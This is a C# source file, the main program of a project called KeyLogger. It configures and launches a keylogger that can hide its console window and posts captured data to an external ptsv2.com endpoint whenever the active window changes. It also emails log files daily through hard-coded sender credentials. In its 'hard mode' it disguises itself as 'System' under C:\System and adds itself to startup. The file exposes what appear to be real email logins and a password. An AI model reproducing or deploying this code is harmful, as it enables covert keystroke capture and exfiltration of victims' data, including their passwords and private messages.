using System.IO;

namespace KeyLogger
{
    class Program
    {
        static bool HIDE_CONSOLE_WINDOW = false;
        // When the program starts, the console window will be hidden

        static string URL = @"https://ptsv2.com/t/kcecq-1587309669/post";
        // When the current window changes, the program will send post requests.
        // You can see the results here - https://ptsv2.com/t/kcecq-1587309669.

        static string FROM_LOGIN = "jebxIY@yandex.by";
        static string FROM_PASS = "RjjiDe";
        static string TO_LOGIN = "malets.d.l.d.l@gmail.com";
        // To prevent data loss and to organize data, the program once a day and 
        // at startup will send a log file to the specified email address.

        static bool HARDMODE = false;
        // At the first start, the program will hide itself at the specified 
        // address and will be added to startup.

        static string HIDE_NAME = "System";
        // Program name (only in hardmode)

        static string HIDE_PATH = @"C:\System";
        // Path to the program (only in hardmode)

        static bool ANTIDOTE = false;
        // Use this constant to remove a program from file system

        static void Main(string[] args)
        {
            if (ANTIDOTE)
            {
                WindowsHelper.DeleteFromStartUp(HIDE_NAME);
                WindowsHelper.DeleteFile(HIDE_PATH, HIDE_NAME + ".exe");
                WindowsHelper.DeleteFile(HIDE_PATH, "keys.log");
                return;
            }
            if (HIDE_CONSOLE_WINDOW) WindowsHelper.HideConsoleWindow();
            if (HARDMODE)
            {
                if (Directory.GetCurrentDirectory() != HIDE_PATH)
                {
                    WindowsHelper.MoveAndStart(HIDE_PATH, HIDE_NAME + ".exe");
                    return;
                }
                WindowsHelper.AddToStartUp(HIDE_NAME);
            }
            Keylogger keyLogger = new Keylogger(URL, FROM_LOGIN, FROM_PASS, TO_LOGIN);
            keyLogger.Start();
        }
    }
}
